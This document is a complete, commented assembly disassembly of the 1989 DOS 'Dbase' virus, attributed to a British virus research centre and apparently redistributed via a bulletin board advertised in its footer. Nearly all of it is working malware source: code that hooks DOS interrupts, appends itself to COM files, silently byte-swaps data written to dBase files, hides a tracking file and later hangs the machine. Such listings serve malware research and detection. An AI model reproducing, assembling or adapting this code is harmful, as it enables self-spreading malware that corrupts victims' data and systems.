	page	65,132
	title	The 'Dbase' Virus
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º                 British Computer Virus Research Centre                   º
; º  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    º
; º  Telephone:     Domestic   0273-26105,   International  +44-273-26105    º
; º                                                                          º
; º                           The 'Dbase' Virus                              º
; º                Disassembled by Joe Hirst,      October 1989              º
; º                                                                          º
; º                      Copyright (c) Joe Hirst 1989.                       º
; º                                                                          º
; º      This listing is only to be made available to virus researchers      º
; º                or software writers on a need-to-know basis.              º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

MCB	SEGMENT AT 0

IDENT	DB	?
OWNER	DW	?
MEMSIZE	DW	?

MCB	ENDS

CODE	SEGMENT BYTE PUBLIC 'CODE'

	ASSUME	CS:CODE,DS:NOTHING

	; Interrupt 21H routine

BP0000:	PUSHF
	CMP	AX,0FB0AH		; Infection test function?
	JNE	BP0010			; Branch if not
	XCHG	AH,AL			; Swap bytes
	POPF
	IRET

	; Branch to open file function

BP000A:	JMP	BP06DB

	; Branch to new file functions

BP000D:	JMP	BP0391

BP0010:	CMP	DI,0FB0AH		; Allow free passage?
	JE	BP0044			; Branch if yes
	CMP	AX,4B00H		; Load and execute function?
	JNE	BP001E			; Branch if not
	JMP	BP0490

BP001E:	CMP	AH,6CH			; Extended open/create function?
	JE	BP000D			; Branch if yes
	CMP	AH,5BH			; Create new file function?
	JE	BP000D			; Branch if yes
	CMP	AH,3CH			; Create handle function?
	JE	BP000D			; Branch if yes
	CMP	AH,3DH			; Open handle function?
	JE	BP000A			; Branch if yes
	CMP	AH,3FH			; Read handle function?
	JE	BP004A			; Branch if yes
	CMP	AH,40H			; Write handle function?
	JE	BP004D			; Branch if yes
	CMP	AH,3EH			; Close handle function?
	JNE	BP0044			; Branch if not
	JMP	BP0340

	; Pass on to Int 21H

BP0044:	POPF
	DB	0EAH			; Far jump
DW0046	DW	0			; Int 21H offset
DW0048	DW	0			; Int 21H segment

	; Branch to read file function

BP004A:	JMP	BP00C8

	; Branch to write file function

BP004D:	JMP	BP015F

	JMP	BP04A7

DB0053	DB	'c:\bugs.dat', 0	; File pathname
	DB	4EH DUP (0), 0FFH	; Read buffer
DW00AE	DW	0
DB00B0	DB	14H DUP (0)		; Table of file handles
DW00C4	DW	0, 0

	; Read file function

BP00C8:	PUSH	DI
	CALL	BP00CC			; \ Get current address
BP00CC:	POP	DI			; /
	SUB	DI,1CH			; Address table of file handles
BP00D0:	CMP	BYTE PTR CS:[DI],0	; End of table?
	JE	BP00DE			; Branch if yes
	CMP	CS:[DI],BL		; Is this the file handle
	JE	BP00E2			; Branch if yes
	INC	DI			; Next entry
	JMP	BP00D0

BP00DE:	POP	DI
	JMP	BP0044			; Pass on to Int 21H

BP00E2:	POP	DI
	POPF
	PUSH	CX
	PUSH	AX
	PUSH	DX
	MOV	AX,4201H		; Move file pointer (current) function
	XOR	CX,CX			; \ No offset
	XOR	DX,DX			; /
	INT	21H			; DOS service
	TEST	AX,1			; Is location odd number byte?
	JZ	BP012A			; Branch if not
	MOV	AX,4201H		; Move file pointer (current) function
	MOV	CX,-1			; \ Back one byte
	MOV	DX,CX			; /
	INT	21H			; DOS service
	MOV	AH,3FH			; Read handle function
	MOV	CX,1			; Length to read
	POP	DX
	CALL	BP05C3			; DOS service
	POP	AX
	POP	CX
	PUSH	SI
	PUSH	BP
	MOV	SI,DX
	MOV	BP,[SI]
	CALL	BP05C3			; DOS service
	PUSHF
	PUSH	AX
	MOV	AX,BP
	MOV	[SI],AL
	POP	AX
	POP	BP
	POP	SI
	PUSH	CX
	PUSH	DX
	MOV	CX,AX
	DEC	CX
	INC	DX
	CALL	BP022D			; Reverse bytes in each word
	POP	DX
	POP	CX
	JMP	BP0138

BP012A:	POP	DX
	POP	AX
	POP	CX
	CALL	BP05C3			; DOS service
	PUSHF
	PUSH	CX
	MOV	CX,AX
	CALL	BP022D			; Reverse bytes in each word
	POP	CX
BP0138:	PUSH	CX
	PUSH	AX
	PUSH	DX
	MOV	AX,4201H		; Move file pointer (current) function
	XOR	CX,CX			; \ No offset
	XOR	DX,DX			; /
	INT	21H			; DOS service
	TEST	AX,1			; Is location odd number byte?
	JZ	BP0158			; Branch if not
	POP	DX
	POP	AX
	PUSH	AX
	PUSH	DX
	ADD	DX,AX
	DEC	DX
	MOV	CX,1			; Length to read
	MOV	AH,3FH			; Read handle function
	CALL	BP05C3			; DOS service
BP0158:	POP	DX
	POP	AX
	POP	CX
	POPF
	RETF	2

	; Write file function

BP015F:	PUSH	DI
	CALL	BP0163			; \ Get current address
BP0163:	POP	DI			; /
	SUB	DI,OFFSET BP0163-DB00B0	; Address table of file handles
BP0168:	CMP	BYTE PTR CS:[DI],0	; End of table?
	JE	BP0176			; Branch if yes
	CMP	CS:[DI],BL		; Is this the file handle
	JE	BP017A			; Branch if yes
	INC	DI			; Next entry
	JMP	BP0168

BP0176:	POP	DI
	JMP	BP0044			; Pass on to Int 21H

BP017A:	CALL	BP017D			; \ Get current address
BP017D:	POP	DI			; /
	SUB	DI,OFFSET BP017D-DW00C4
	MOV	WORD PTR CS:[DI],0
	MOV	WORD PTR CS:[DI+2],0
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	MOV	AX,4201H		; Move file pointer (current) function
	XOR	CX,CX			; \ No offset
	XOR	DX,DX			; /
	MOV	DI,0FB0AH		; Allow free passage to DOS
	INT	21H			; DOS service
	TEST	AX,1			; Is location odd number byte?
	JNZ	BP01C0			; Branch if yes
	POP	DX
	POP	CX
	TEST	AX,1			; Is location odd number byte?
	JNZ	BP01B2			; Branch if yes (???)
	MOV	AX,0
	CALL	BP0200
	JMP	BP01E9

BP01B2:	MOV	AX,1
	CALL	BP0200
	JB	BP01E9
	CALL	BP02B9
	JMP	BP01E9

BP01C0:	POP	DX
	POP	CX
	TEST	CX,1
	JZ	BP01D6
	CALL	BP0262
	JB	BP01E9
	MOV	AX,0100H
	CALL	BP0200
	JMP	BP01E9

BP01D6:	CALL	BP0262
	JB	BP01E9
	MOV	AX,0101H
	CALL	BP0200
	JB	BP01E9
	CALL	BP02B9
	JMP	BP01E9

BP01E9:	POP	BX
	POP	AX
	POP	DI
	CALL	BP01EF			; \ Get current address
BP01EF:	POP	SI			; /
	SUB	SI,OFFSET BP01EF-DW00C4
	PUSH	CS:[SI+2]
	POPF
	MOV	AX,CS:[SI]
	POP	SI
	RETF	2

BP0200:	CMP	CX,1
	JNE	BP0209
	CALL	BP0242
	RET

BP0209:	CALL	BP0215
	CALL	BP0242
	PUSHF
	CALL	BP0215
	POPF
	RET

BP0215:	PUSH	CX
	PUSH	DX
	CALL	BP0220
	CALL	BP022D			; Reverse bytes in each word
	POP	DX
	POP	CX
	RET

BP0220:	CMP	AH,1
	JNE	BP0227
	INC	DX
	DEC	CX
BP0227:	CMP	AL,1
	JNE	BP022C
	DEC	CX
BP022C:	RET

	; Reverse bytes in each word

BP022D:	PUSH	SI
	PUSH	CX
	PUSH	AX
	MOV	SI,DX
	SHR	CX,1			; Divide count by two
BP0234:	MOV	AX,[SI]			; Get next word
	XCHG	AH,AL			; Reverse bytes in word
	MOV	[SI],AX			; Replace word
	INC	SI			; \ Next word
	INC	SI			; /
	LOOP	BP0234			; Repeat for count
	POP	AX
	POP	CX
	POP	SI
	RET

BP0242:	PUSH	AX
	PUSH	CX
	PUSH	DX
	PUSH	DI
	CALL	BP0220
	MOV	AH,40H			; Write handle function
	INT	21H			; DOS service
	PUSHF
	CALL	BP0251			; \ Get current address
BP0251:	POP	DI			; /
	SUB	DI,OFFSET BP0251-DW00C4
	POP	CS:[DI+2]
	ADD	CS:[DI],AX
	POP	DI
	POP	DX
	POP	CX
	POP	AX
	RET

BP0262:	PUSH	AX
	PUSH	CX
	PUSH	DX
	PUSH	SI
	PUSH	BP
	MOV	DX,-1			; \ Back one byte
	MOV	CX,DX			; /
	MOV	AX,4201H		; Move file pointer (current) function
	INT	21H			; DOS service
	MOV	AH,3FH			; Read handle function
	MOV	CX,1			; Length to read
	MOV	SI,DX
	MOV	BP,[SI]
	INT	21H			; DOS service
	JB	BP02A3			; Branch if error
	MOV	DX,-1			; \ Back one byte
	MOV	CX,DX			; /
	MOV	AX,4201H		; Move file pointer (current) function
	INT	21H			; DOS service
	XCHG	BP,[SI]
	MOV	CX,1			; Length to write
	MOV	AH,40H			; Write handle function
	INT	21H			; DOS service
	JB	BP02A3			; Branch if error
	XCHG	BP,[SI]
	MOV	CX,1			; Length to write
	MOV	AH,40H			; Write handle function
	INT	21H			; DOS service
	JB	BP02A3			; Branch if error
	XCHG	BP,[SI]
	MOV	AX,1
BP02A3:	PUSHF
	CALL	BP02A7			; \ Get current address
BP02A7:	POP	SI			; /
	SUB	SI,OFFSET BP02A7-DW00C4
	POP	CS:[SI+2]
	MOV	CS:[SI],AX
	POP	BP
	POP	SI
	POP	DX
	POP	CX
	POP	AX
	RET

BP02B9:	PUSH	AX
	PUSH	CX
	PUSH	DX
	PUSH	SI
	PUSH	BP
	MOV	SI,DX
	ADD	SI,CX
	DEC	SI
	MOV	DX,1			; \ Forward one byte
	XOR	CX,CX			; /
	MOV	AX,4201H		; Move file pointer (current) function
	INT	21H			; DOS service
	MOV	AH,3FH			; Read handle function
	MOV	CX,1			; Read one byte
	MOV	BP,[SI]
	INT	21H			; DOS service
	JB	BP02E0			; Branch if error
	CMP	AX,1			; One byte read?
	JNE	BP02E0			; Branch if not
	JMP	BP02F6

BP02E0:	MOV	CX,-1			; \ Back one byte
	MOV	DX,CX			; /
	MOV	AX,4201H		; Move file pointer (current) function
	INT	21H			; DOS service
	MOV	DX,SI
	MOV	CX,1			; Length to write
	MOV	AH,40H			; Write handle function
	INT	21H			; DOS service
	JMP	BP032A

BP02F6:	MOV	DX,-2			; \ Back two byte
	MOV	CX,-1			; /
	MOV	AX,4201H		; Move file pointer (current) function
	INT	21H			; DOS service
	XCHG	BP,[SI]
	MOV	CX,1			; Length to write
	MOV	AH,40H			; Write handle function
	MOV	DX,SI
	INT	21H			; DOS service
	JB	BP032A			; Branch if error
	XCHG	BP,[SI]
	MOV	CX,1			; Length to write
	MOV	AH,40H			; Write handle function
	MOV	DX,SI
	INT	21H			; DOS service
	JB	BP032A			; Branch if error
	XCHG	BP,[SI]
	MOV	DX,-1			; \ Back one byte
	MOV	CX,DX			; /
	MOV	AX,4201H		; Move file pointer (current) function
	INT	21H			; DOS service
	MOV	AX,1
BP032A:	PUSHF
	CALL	BP032E			; \ Get current address
BP032E:	POP	SI			; /
	SUB	SI,OFFSET BP032E-DW00C4
	POP	CS:[SI+2]
	ADD	CS:[SI],AX
	POP	BP
	POP	SI
	POP	DX
	POP	CX
	POP	AX
	RET

BP0340:	PUSH	BP
	PUSH	CX
	CALL	BP0345			; \ Get current address
BP0345:	POP	BP			; /
	SUB	BP,OFFSET BP0345-DW00AE
	MOV	CX,CS:[BP+0]
	CMP	CX,0
	JE	BP037C
	ADD	BP,2
BP0356:	CMP	CS:[BP+0],BL
	JE	BP0362
	INC	BP
	LOOP	BP0356
	JMP	BP037C

BP0362:	MOV	CL,CS:[BP+1]
	MOV	CS:[BP+0],CL
	INC	BP
	CMP	CL,0
	JNE	BP0362
	CALL	BP0373			; \ Get current address
BP0373:	POP	BP			; /
	SUB	BP,OFFSET BP0373-DW00AE
	DEC	WORD PTR CS:[BP+0]
BP037C:	POP	CX
	POP	BP
	JMP	BP0044			; Pass on to Int 21H

BP0381:	JMP	BP04A7

	JMP	BP0044			; Pass on to Int 21H

DW0387	DW	0			; File date
DW0389	DW	0			; File time
DW038B	DW	0			; File attributes
DW038D	DW	0			; Pathname segment
DW038F	DW	0			; Pathname offset

	; New file functions

BP0391:	PUSH	SI
	PUSH	BP
	CMP	AH,6CH			; Extended open/create function?
	JE	BP039A			; Branch if yes
	MOV	SI,DX			; Copy filepath pointer
BP039A:	MOV	BP,SI			; Copy filepath pointer
	CALL	BP0453			; Convert pathname to uppercase
	CALL	BP0468			; Test for Dbase file
	JNE	BP0381			; Branch if not
	PUSH	DX
	MOV	DX,SI			; Copy pathname (for function 6CH)
	CALL	BP0665			; Search BUG.DAT file for pathname
	POP	DX
	JB	BP0415			; Branch if found
	PUSH	ES
	PUSH	DS
	PUSH	DX
	PUSH	SI
	PUSH	DI
	PUSH	CX
	PUSH	BX
	PUSH	AX
	CALL	BP03B8			; \ Get current address
BP03B8:	POP	DX			; /
	SUB	DX,OFFSET BP03B8-DB0053	; Address 'BUGS.DAT' pathname
	PUSH	BP
	MOV	BP,DS			; \ Set ES to DS
	MOV	ES,BP			; /
	POP	BP
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	AX,3D02H		; Open handle (R/W) function
	MOV	DI,0FB0AH		; Allow free passage to DOS
	INT	21H			; DOS service
	JNB	BP03D8			; Branch if no error
	MOV	AH,3CH			; Create handle function
	MOV	CX,2			; Hidden file
	INT	21H			; DOS service
	JB	BP0448			; Branch if error
BP03D8:	MOV	BX,AX			; Move handle
	CALL	BP06F7			; Is file out of time?
	XOR	DX,DX			; \ No offset
	XOR	CX,CX			; /
	MOV	AX,4202H		; Move file pointer (EOF) function
	INT	21H			; DOS service
	MOV	DX,BP
	MOV	DI,DX
	MOV	BP,ES			; \ Set DS to ES
	MOV	DS,BP			; /
	MOV	CX,004EH		; Length to write
	MOV	AH,40H			; Write handle function
	MOV	DI,0FB0AH		; Allow free passage to DOS
	INT	21H			; DOS service
	CALL	BP03FB			; \ Get current address
BP03FB:	POP	SI			; /
	SUB	SI,74H			; Address file date
	MOV	DX,CS:[SI]		; Get file date
	MOV	AX,5701H		; Set file date & time function
	INT	21H			; DOS service
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	JB	BP0448			; Branch if error
	POP	AX
	POP	BX
	POP	CX
	POP	DI
	POP	SI
	POP	DX
	POP	DS
	POP	ES
BP0415:	POP	BP
	POP	SI
	POPF
	CALL	BP05C3			; DOS service
	JB	BP0420			; Branch if error
	CALL	BP0423
BP0420:	RETF	2

BP0423:	PUSHF
	PUSH	SI
	CALL	BP0428			; \ Get current address
BP0428:	POP	SI			; /
	SUB	SI,OFFSET BP0428-DW00AE
	CMP	WORD PTR CS:[SI],14H
	JE	BP0447
	INC	WORD PTR CS:[SI]
	PUSH	BX
	MOV	BX,SI
	ADD	BX,CS:[SI]
	ADD	BX,CS:[SI]
	MOV	SI,BX
	POP	BX
	MOV	CS:[SI],AL
	POP	SI
	POPF
BP0447:	RET

BP0448:	POP	AX
	POP	BX
	POP	CX
	POP	DI
	POP	SI
	POP	DX
	POP	DS
	POP	ES
	JMP	BP04A7

	; Convert pathname to uppercase

BP0453:	PUSH	SI
	MOV	SI,DX			; Copy pathname pointer
BP0456:	CMP	BYTE PTR [SI],0		; End of pathname?
	JE	BP0466			; Branch if yes
	CMP	BYTE PTR [SI],'a'	; Lowercase character?
	JB	BP0463			; Branch if not
	SUB	BYTE PTR [SI],' '	; Convert to uppercase
BP0463:	INC	SI			; Next character
	JMP	BP0456			; Process next character

BP0466:	POP	SI
	RET

	; Test for Dbase file

BP0468:	CALL	BP0453			; Convert pathname to uppercase
	PUSH	SI
BP046C:	CMP	BYTE PTR [SI],0		; End of pathname?
	JE	BP0480			; Branch if yes
	CMP	BYTE PTR [SI],'.'	; Extension character?
	JE	BP0479			; Branch if yes
	INC	SI			; Next character
	JMP	BP046C			; Process next character

BP0479:	INC	SI			; Next character
	CMP	WORD PTR [SI],'BD'	; Database file (1)?
	JNE	BP0484			; Branch if not
BP0480:	CMP	BYTE PTR [SI+2],'F'	; Database file (2)?
BP0484:	POP	SI
	RET

DB0486	DB	0CDH, 20H, 90H, 90H	; Start of host read buffer
DB048A	DB	0, 0			; Signature read buffer
DB048C	DB	0E9H, 0, 0		; Initial jump instruction
	DB	0

	; Load and execute function

BP0490:	PUSH	BP
	PUSH	SI
	MOV	SI,DX			; Copy pathname pointer
BP0494:	CMP	BYTE PTR [SI],0		; End of pathname?
	JE	BP04A7			; Branch if yes
	CMP	BYTE PTR [SI],'.'	; Extension indicator?
	JE	BP04AC			; Branch if yes
	INC	SI			; Next character
	JMP	BP0494			; Process next character

BP04A1:	POP	DS
	POP	DX
	POP	DI
	POP	CX
	POP	BX
	POP	AX
BP04A7:	POP	BP
	POP	SI
	JMP	BP0044			; Pass on to Int 21H

BP04AC:	INC	SI			; Next character
	CMP	WORD PTR [SI],'OC'	; Is it a COM file? (1)
	JNE	BP04A7			; Branch if not
	CMP	BYTE PTR [SI+2],'M'	; Is it a COM file? (1)
	JNE	BP04A7			; Branch if not
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DI
	PUSH	DX
	PUSH	DS
	PUSH	SI
	PUSH	CX
	MOV	AX,4300H		; Get file attributes function
	INT	21H			; DOS service
	CALL	BP04C9			; \ Get current address
BP04C9:	POP	SI			; /
	SUB	SI,OFFSET BP04C9-DW038B	; Address file attributes
	MOV	CS:[SI],CX		; Save file attributes
	MOV	CS:[SI+2],DS		; Save pathname segment
	MOV	CS:[SI+4],DX		; Save pathname offset
	AND	CX,00FEH		; Switch off read only
	MOV	AX,4301H		; Set file attributes function
	INT	21H			; DOS service
	POP	CX
	POP	SI
	MOV	AX,3D00H		; Open handle (read) function
	INT	21H			; DOS service
	JB	BP04A1			; Branch if error
	MOV	BX,AX			; Move handle
	MOV	AX,5700H		; Get file date & time function
	INT	21H			; DOS service
	PUSH	SI
	CALL	BP04F6			; \ Get current address
BP04F6:	POP	SI			; /
	SUB	SI,OFFSET BP04F6-DW0387	; Address file date
	MOV	CS:[SI],DX		; Save file date
	MOV	CS:[SI+2],CX		; Save file time
	POP	SI
	MOV	AH,3FH			; Read handle function
	MOV	CX,4			; Length to read
	CALL	BP050B			; \ Get current address
BP050B:	POP	SI			; /
	SUB	SI,OFFSET BP050B	; Offset of start of virus
	MOV	DX,SI			; \ Address start of host read buffer
	ADD	DX,OFFSET DB0486	; /
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	INT	21H			; DOS service
	JB	BP058A			; Branch if error
	PUSH	DX
	PUSH	SI
	MOV	SI,DX			; Address start of host read buffer
	MOV	DX,[SI+1]		; Get branch offset (if its a branch?)
	INC	DX			; \ Address to signature (DB0630)
	XOR	CX,CX			; /
	MOV	AX,4200H		; Move file pointer (start) function
	INT	21H			; DOS service
	POP	SI
	POP	DX
	JB	BP058A			; Branch if error
	MOV	AH,3FH			; Read handle function
	MOV	CX,2			; Length to read
	ADD	DX,4			; Address to signature read buffer
	INT	21H			; DOS service
	PUSH	SI
	MOV	SI,DX			; \ Copy signature read buffer address
	MOV	DI,SI			; /
	CMP	WORD PTR [SI],0E5E5H	; Test signature
	POP	SI
	JE	BP058A			; Branch if infected
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	POP	DS
	POP	DX
	PUSH	DX
	PUSH	DS
	MOV	AX,3D02H		; Open handle (R/W) function
	INT	21H			; DOS service
	JNB	BP0557			; Branch if no error
	JMP	BP04A1

BP0557:	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	BX,AX			; Move handle
	MOV	AX,4202H		; Move file pointer (EOF) function
	XOR	CX,CX			; \ No offset
	XOR	DX,DX			; /
	INT	21H			; DOS service
	ADD	AX,OFFSET START-3	; Add entry point offset
	NOP
	MOV	[DI+3],AX		; Store in initial jump instruction
	XOR	DX,DX			; Address start of virus
	MOV	AH,40H			; Write handle function
	MOV	CX,OFFSET ENDADR	; Length of virus
	NOP
	INT	21H			; DOS service
	MOV	AX,4200H		; Move file pointer (start) function
	XOR	CX,CX			; \ No offset
	XOR	DX,DX			; /
	INT	21H			; DOS service
	MOV	DX,DI			; \ Address initial jump instruction
	ADD	DX,2			; /
	MOV	CX,3			; Length of jump instruction
	MOV	AH,40H			; Write handle function
	INT	21H			; DOS service
BP058A:	PUSH	SI
	CALL	BP058E			; \ Get current address
BP058E:	POP	SI			; /
	SUB	SI,OFFSET BP058E-DW0387	; Address file date
	MOV	DX,CS:[SI]		; Get file date
	MOV	CX,CS:[SI+2]		; Get file time
	POP	SI
	MOV	AX,5701H		; Set file date & time function
	INT	21H			; DOS service
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	PUSH	SI
	PUSH	CX
	CALL	BP05A9			; \ Get current address
BP05A9:	POP	SI			; /
	SUB	SI,OFFSET BP05A9-DW038B	; Address file attributes
	MOV	CX,CS:[SI]		; Get file attributes
	MOV	DS,CS:[SI+2]		; Get pathname offset
	MOV	DX,CS:[SI+4]		; Get pathname segment
	MOV	AX,4301H		; Set file attributes function
	INT	21H			; DOS service
	POP	CX
	POP	SI
	JMP	BP04A1

	; Call DOS service

BP05C3:	PUSHF
	DB	9AH			; Far call
DW05C5	DW	0			; Int 21H offset
DW05C7	DW	0			; Int 21H segment
	RET

	; Infect system

BP05CA:	PUSH	SI
	CALL	BP05CE			; \ Get current address
BP05CE:	POP	SI			; /
	SUB	SI,OFFSET BP05CE	; Relocate from start of virus
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DI
	PUSH	DS
	PUSH	ES
	MOV	AX,3521H		; Get Int 21H function
	INT	21H			; DOS service
	MOV	CS:[SI+46H],BX		; \ Install vector in jump
	MOV	CS:[SI+48H],ES		; /
	MOV	CS:DW05C5[SI],BX	; \ Install vector in call
	MOV	CS:DW05C7[SI],ES	; /
	PUSH	CS			; \ Get current segment
	POP	AX			; /
	DEC	AX			; \ Address MCB
	MOV	DS,AX			; /
	ASSUME	DS:MCB
	MOV	DX,MEMSIZE		; Get memory block length
	SUB	DX,0074H		; \ Subtract virus length
	nop
	DEC	DX			; /
	MOV	MEMSIZE,DX		; Replace new length
	ASSUME	DS:NOTHING
	PUSH	CS			; \ Get current segment
	POP	AX			; /
	ADD	DX,AX			; \ Address free space
	MOV	DS,DX			; /
	MOV	DI,0			; Start of free space
	MOV	CX,OFFSET ENDADR		; Length of virus
	NOP
	CLI
	PUSH	SI
BP0612:	MOV	AL,CS:[SI]
	MOV	[DI],AL
	INC	SI
	INC	DI
	LOOP	BP0612
	POP	SI
	MOV	DS,DX
	MOV	DX,OFFSET BP0000
	MOV	AX,2521H		; Set Int 21H function
	INT	21H			; DOS service
	STI
	POP	ES
	POP	DS
	POP	DI
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	JMP	BP0640

DB0630	DB	0E5H, 0E5H

	; Entry point

START:	PUSH	AX
	MOV	AX,0FB0AH		; Infection test function
	INT	21H			; DOS service
	CMP	AX,0AFBH		; Is system infected?
	JE	BP0640			; Branch if yes
	JMP	BP05CA

BP0640:	PUSH	SI
	CALL	BP0644			; \ Get current address
BP0644:	POP	SI			; /
	SUB	SI,OFFSET BP0644-DB0486	; Address start of host read buffer
	PUSH	BX
	MOV	BX,0100H		; Address start of host
	MOV	AX,CS:[SI]		; \ Restore start of host (1)
	MOV	CS:[BX],AX		; /
	MOV	AX,CS:[SI+2]		; \
	ADD	BX,2			;  ) Restore start of host (2)
	MOV	CS:[BX],AX		; /
	POP	BX
	POP	SI
	POP	AX
	MOV	AX,0100H		; \ Branch to start of host
	JMP	AX			; /

	; Search BUG.DAT file for pathname

BP0665:	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	SI
	PUSH	DI
	PUSH	BP
	PUSH	DS
	PUSH	ES
	CALL	BP0671			; \ Get current address
BP0671:	POP	BP			; /
	SUB	BP,OFFSET BP0671-DB0053	; Address 'BUGS.DAT' pathname
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	MOV	DI,DX			; Copy pathname pointer
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	DX,BP			; Move pathname address
	MOV	AX,3D00H		; Open handle (read) function
	PUSH	DI
	MOV	DI,0FB0AH		; Allow free passage to DOS
	INT	21H			; DOS service
	JNB	BP0697			; Branch if no error
	MOV	AH,3CH			; Create handle function
	MOV	CX,2			; Hidden file
	INT	21H			; DOS service
	JNB	BP0697			; Branch if no error
BP0692:	POP	DI
	CLC
	JMP	BP06D1

BP0697:	MOV	BX,AX			; Move handle
	ADD	DX,0CH			; Read buffer
BP069C:	MOV	CX,004EH		; Length to read
	MOV	AH,3FH			; Read handle function
	INT	21H			; DOS service
	JB	BP0692			; Branch if error
	CMP	AX,0			; Did we read anything?
	JNE	BP06B0			; Branch if yes
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	JMP	BP0692

BP06B0:	POP	DI
	MOV	SI,DX
	PUSH	DI
BP06B4:	MOV	AL,ES:[DI]		; Get next character
	CMP	AL,0			; End of pathname?
	JE	BP06C3			; Branch if yes
	CMP	AL,[SI]			; Does it match file?
	JNE	BP069C			; Read next section if not
	INC	SI			; Next file character
	INC	DI			; Next pathname character
	JMP	BP06B4			; Compare next character

	; Pathname found on BUG.DAT file

BP06C3:	POP	DI
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	STC
	JMP	BP06D1

	; unreferenced code

	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	CLC

BP06D1:	POP	ES
	POP	DS
	POP	BP
	POP	DI
	POP	SI
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	RET

	; Open file function

BP06DB:	POPF
	CALL	BP05C3			; DOS service
	JB	BP06F4			; Branch if error
	PUSHF
	PUSH	SI
	MOV	SI,DX
	CALL	BP0468			; Test for Dbase file
	JNE	BP06F2			; Branch if not
	CALL	BP0665			; Search BUG.DAT file for pathname
	JNB	BP06F2			; Branch if not found
	CALL	BP0423
BP06F2:	POP	SI
	POPF
BP06F4:	RETF	2

	; Is file out of time?

BP06F7:	PUSH	AX
	PUSH	CX
	PUSH	DX
	PUSH	SI
	MOV	AX,5700H		; Get file date & time function
	INT	21H			; DOS service
	CALL	BP0703			; \ Get current address
BP0703:	POP	SI			; /
	SUB	SI,OFFSET BP0703-DW0387	; Address file date
	MOV	CS:[SI],DX		; Save file date
	MOV	CL,5			; \ Move month to bottom of reg
	SHR	DX,CL			; /
	AND	DX,0FH			; Isolate month
	MOV	AH,2AH			; Get date function
	PUSH	DX			; Preserve file month
	INT	21H			; DOS service
	POP	CX			; Recover file month
	SUB	CL,DH			; Subtract month from file month
	CMP	CL,0			; Negative result?
	JGE	BP0721			; Branch if not
	NEG	CL			; Change the sign
BP0721:	CMP	CL,3			; Three months difference?
	JL	BP0729			; Branch if not
	JMP	BP072E

BP0729:	POP	SI
	POP	DX
	POP	CX
	POP	AX
	RET

	; File three months old (or next year)

BP072E:	CLI
	MOV	AX,3			; Start count
BP0732:	MOV	CX,0100H
	MOV	DX,0			; \ Address zero
	MOV	DS,DX			; /
	XOR	BX,BX
	PUSH	AX
	INT	3			; Breakpoint
	INT	3			; Breakpoint
	POP	AX
	INC	AX			; Increment count
	CMP	AL,1AH			; Has it reached 26?
	JL	BP0732			; Branch if not
BP0745:	CLI				; \ Loop with interrupts disabled
	JMP	BP0745			; /

ENDADR	EQU	$

CODE	ENDS

	END

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

